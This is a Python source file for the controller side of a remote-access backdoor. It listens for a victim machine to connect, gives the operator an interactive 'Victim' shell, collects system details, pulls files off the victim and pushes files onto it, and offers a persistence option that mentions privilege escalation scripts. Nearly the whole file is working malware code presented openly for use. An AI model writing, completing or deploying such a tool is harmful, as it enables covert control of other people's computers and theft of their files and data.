import os
import socket
import platform
import subprocess
import sys
from typing import Tuple
import pyfiglet
import base64

banner = pyfiglet.figlet_format("Backdoor")
print(banner)
download_help = "\nIf you want to download a file that is in this same folder, write the name of the file, if you want to download a file from any other path on the system. CLOSE YOUR PROGRAM, turn it on again, choose option 2 SHELL, and there go to the directory where the file is and there you do the following command"
download_help2 = "download filename \n"
ip = "127.0.0.1"
port = 1212
a = 0
linea = "-------------------------------------"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def conection():
    global connection
    global client_ip
    server_con = ip,port
    # cambiar ip, LA TUYA
    client_ip = "127.0.0.1", 1212
    server.bind(client_ip)
    server.listen(1)
    print("Waiting for conncections...")
    connection, client_ip = server.accept()
    print("Conceted by", client_ip)
    
conection()

def shell():
    global actual_directory
    global actual_directory2
    actual_directory = connection.recv(1024)
    actual_directory2 = actual_directory.decode()
    global result_cd
    global command
    global output2
    while True:
        command = input("\n Victim:~$ ")
        if len(command) == 0:
            continue
        elif command == "exit":
            connection.send(command)
            break
        elif command[:2] == "cd":
            command_cd = command.encode()
            connection.send(command_cd)
            result_cd = connection.recv(1024)
            result_cd2 = result_cd.decode()
            print(result_cd2)
        elif command == "menu":
            choose()
        elif command == KeyboardInterrupt:
            break
        elif command[:8] == "download":
            command_download = command.encode()
            connection.send(command_download)
            print("Rabo")
            with open(command[9:],"wb") as filejj:
                recivir = connection.recv(30000)
                filejj.write(base64.b64decode(recivir)) 
                print("File recived correctly")
        else:
            command_final = command.encode()
            connection.send(command_final)
            output = connection.recv(10124)
            output2 = output.decode()
            print(output2)
            

def sysinfo():
    print(linea)
    print(linea)
    print(linea)
    print("\nHostname: ")
    name = connection.recv(1024)
    hostname = name.decode()
    print(hostname)

    print("\nInterface: ")
    ips = connection.recv(1024)
    ips2 = ips.decode()
    print(ips2)

    print("\nUser: ")
    user = connection.recv(1024)
    user2 = user.decode()
    print(user2)

    print("\nOperative System: ")
    oss = connection.recv(1024)
    oss2 = oss.decode()
    print(oss2[13:])

    print("\nShell type: ")
    shell_type = connection.recv(1024)
    shell_type2 = shell_type.decode()
    print(shell_type2)

    option = str(input("1- Back to the menu\n Option:"))
    if option == "1":
        choose()

def download():
    print(linea)
    print("If you want to download a file that is in the directory where you have executed the victim's python, execute: \ndownload namefile\n If you want to download any file from any folder go to option 1 (shell) and with cd go to the file you want and execute:\ndownload filename")
    print(linea)
    while True:
        command_download = input("\n Download files: ")
        command_len = len(command_download)
        command_download2 = command_download.encode()
        connection.send(command_download2)
        if command_len == 0:
            continue
        if command_download == "menu":
            choose()
        if command_download[:8] == "download":
            with open(command_download[9:],"wb") as filejj:
                recivir = connection.recv(30000)
                filejj.write(base64.b64decode(recivir))
        break    

            
def upload():
    while True:
        command_upload = input("\n Upload files: ")
        command_len = len(command_upload)
        command_upload2 = command_upload.encode()
        connection.send(command_upload2)
        if command_upload == "menu":
            choose()
        if command_upload[:6] == "upload":
            with open(command_upload[7:],"rb") as filejj:
                connection.send(base64.b64encode(filejj.read()))
        break

def persistence():
    print(linea)
    print("If victim not execute client file with sudo it's not possible.\nBut you have the option to upload a escalation privilege script")
    print("\nWait 5 seconds...")
    choose()


bb = "1"

def choose2():
    pregunta98 = input("\nChoose one of this options \n 1- Shell  \n 2- System info \n 3- Download files from victim\n 4- Upload files from Server to Victim\n 5- Create Persistence\nOption: ")
    if pregunta98 == "1":
        pregunta11 = pregunta98.encode()
        connection.send(pregunta11)
        shell()
    elif pregunta98 == "2":
        pregunta21 = pregunta98.encode()
        connection.send(pregunta21)
        sysinfo()
    elif pregunta98 == "3":
        pregunta31 = pregunta98.encode()
        connection.send(pregunta31)
        download()
    elif pregunta98 == "4":
        pregunta41 = pregunta98.encode()
        connection.send(pregunta41)
        upload()
    elif pregunta98 == "5":
        pregunta51 = pregunta98.encode()
        connection.send(pregunta51)
        persistence()


def choose():
    pregunta = input("\nChoose one of this options \n 1- Shell  \n 2- System info \n 3- Download files from victim\n 4- Upload files from Server to Victim\n 5- Create Persistence \n 6- Come Back to Options Menú\nOption: ")
    if pregunta == "1":
        pregunta1 = pregunta.encode()
        connection.send(pregunta1)
        shell()
    elif pregunta == "2":
        pregunta2 = pregunta.encode()
        connection.send(pregunta2)
        sysinfo()
    elif pregunta == "3":
        pregunta3 = pregunta.encode()
        connection.send(pregunta3)
        download()
    elif pregunta == "4":
        pregunta4 = pregunta.encode()
        connection.send(pregunta4)
        upload()
    elif pregunta == "5":
        pregunta5 = pregunta.encode()
        connection.send(pregunta5)
        persistence()
    elif pregunta == "6":
        choose2()

choose()